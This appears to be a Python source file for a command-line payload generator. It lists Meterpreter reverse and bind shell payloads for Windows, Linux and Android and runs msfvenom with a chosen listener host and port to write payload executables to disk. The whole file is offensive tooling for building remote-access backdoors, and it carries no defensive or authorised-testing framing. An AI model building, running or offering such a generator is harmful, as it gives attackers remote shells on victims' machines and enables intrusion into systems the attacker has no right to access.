#!/usr/bin/env python3

import os
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
import subprocess

console = Console()

class PayloadGenerator:
    def __init__(self):
        self.payloads_dir = "payloads"
        self.available_payloads = {
            "windows": {
                "reverse_tcp": "windows/meterpreter/reverse_tcp",
                "reverse_https": "windows/meterpreter/reverse_https",
                "bind_tcp": "windows/meterpreter/bind_tcp"
            },
            "linux": {
                "reverse_tcp": "linux/x86/meterpreter/reverse_tcp",
                "reverse_https": "linux/x86/meterpreter/reverse_https",
                "bind_tcp": "linux/x86/meterpreter/bind_tcp"
            },
            "android": {
                "reverse_tcp": "android/meterpreter/reverse_tcp",
                "reverse_https": "android/meterpreter/reverse_https"
            }
        }
        
    def list_payloads(self):
        """Display available payloads"""
        table = Table(title="Available Payloads")
        table.add_column("Platform", style="cyan")
        table.add_column("Type", style="green")
        table.add_column("Payload", style="yellow")
        
        for platform, types in self.available_payloads.items():
            for payload_type, payload in types.items():
                table.add_row(platform, payload_type, payload)
                
        console.print(table)
        
    def generate_payload(self, platform, payload_type, lhost, lport, output_format="exe"):
        """Generate payload using msfvenom"""
        try:
            if platform not in self.available_payloads or payload_type not in self.available_payloads[platform]:
                console.print("[red]Invalid platform or payload type![/red]")
                return False
                
            payload = self.available_payloads[platform][payload_type]
            output_file = f"{self.payloads_dir}/{platform}_{payload_type}.{output_format}"
            
            if not os.path.exists(self.payloads_dir):
                os.makedirs(self.payloads_dir)
                
            cmd = [
                "msfvenom",
                "-p", payload,
                "LHOST=" + lhost,
                "LPORT=" + str(lport),
                "-f", output_format,
                "-o", output_file
            ]
            
            console.print("[yellow]Generating payload...[/yellow]")
            subprocess.run(cmd, check=True)
            
            console.print(f"[green]Payload generated successfully: {output_file}[/green]")
            return True
            
        except subprocess.CalledProcessError as e:
            console.print(f"[red]Error generating payload: {str(e)}[/red]")
            return False 